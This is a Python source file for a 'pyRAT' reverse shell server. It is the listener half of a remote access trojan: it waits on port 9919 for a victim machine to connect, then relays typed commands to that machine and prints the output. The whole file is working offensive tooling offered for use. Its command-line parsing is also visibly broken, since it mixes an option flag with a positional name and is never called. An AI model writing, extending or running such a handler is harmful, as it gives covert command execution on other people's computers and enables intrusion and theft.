"""

pyRAT reverse shell server

usage: python v_server.py

notes:

credit: Ivan Teong : https://github.com/iteong/reverse-shell
            his code is used as the base of my reverse shell handler

"""

import socket
import sys
import argparse


def create_socket(port_number=9919):
    try:
        global host
        global port
        global s
        host = ''
        port = port_number
        # don't use common ports like 80, 3389

        s = socket.socket()  # actual conversation between server and client
    except socket.error as msg:
        print("Error creating socket: " + str(msg))


# binds socket to port and wait for connection from client/target
def socket_bind():
    try:
        global host
        global port
        global s
        host = '0.0.0.0'  # changed to prevent null being passed through
        print("Binding socket to port: " + str(port))
        s.bind((host, port))
        # host: usually an IP address, but since we listening to our own machine, it is blank
        # edit: now changed to 0.0.0.0 manually
        s.listen(5)
        # listen 5 is number of bad connections it will take before refusing
    except socket.error as msg:
        print("Error binding socket to port: " + str(msg) + "\n" + "Retrying...")
        socket_bind()  # recursion, keeps trying if error happens


# establish connection with client (socket must be listening for connections)
def socket_accept():
    conn, address = s.accept()
    print("Connection has been established | IP " + address[0] + " | Port " + str(address[1]))
    print("[+] Type 'quit' at any time to close connection.")
    send_commands(conn)
    conn.close()


def send_commands(conn):
    while True:  # infinite loop for connection to stay constant
        cmd = input()  # cmd = command we type into terminal to send to client

        # whatever we type into command line and when running/storing commands is of byte type
        # whenever we want to send across network, need to be of byte type
        # to print out for user, need to be changed to string
        if cmd == 'quit':
            print("[+] Closing the connection...")
            conn.close()
            s.close()
            print("[+] Connection closed. Goodbye.")
            sys.exit()
        if len(str.encode(cmd)) > 0:  # check that the command is not empty, otherwise do not send across network
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024), "utf-8")  # 1024 is buffer size, utf-8 to convert to normal string
            print(client_response, end="")  # default end = '\n', change it to '' so don't give new line at the end


def parse():
    """parse port or send default port"""

    parser = argparse.ArgumentParser(prog='v_server.py',
                                     description='''simple reverse shell listener server''',
                                     epilog='''Have Fun!''',
                                     usage='%(prog)s [-p] [port]'
                                     )
    parser.add_argument("-p", "port", type=int, default=9919, help="Port to listen on")
    args = parser.parse_args()

    # return the input args
    port_number = args.port
    return port_number


def main(port_number=9919):
    create_socket(port_number)
    socket_bind()
    socket_accept()


if __name__ == '__main__':
    # call the main function
    main()